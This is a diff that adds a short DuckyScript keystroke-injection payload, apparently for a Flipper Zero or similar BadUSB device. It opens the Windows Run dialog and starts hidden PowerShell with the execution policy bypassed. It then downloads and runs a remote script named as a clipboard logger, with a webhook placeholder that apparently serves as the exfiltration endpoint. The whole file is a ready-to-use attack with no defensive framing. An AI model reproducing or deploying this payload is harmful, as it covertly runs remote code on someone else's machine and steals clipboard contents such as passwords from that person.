@@ -1,0 +1,7 @@
+DELAY 100
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='Webhook_Here'; irm https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ClipbrdLog/CliLog.ps1 | iex
+ENTER
+
+
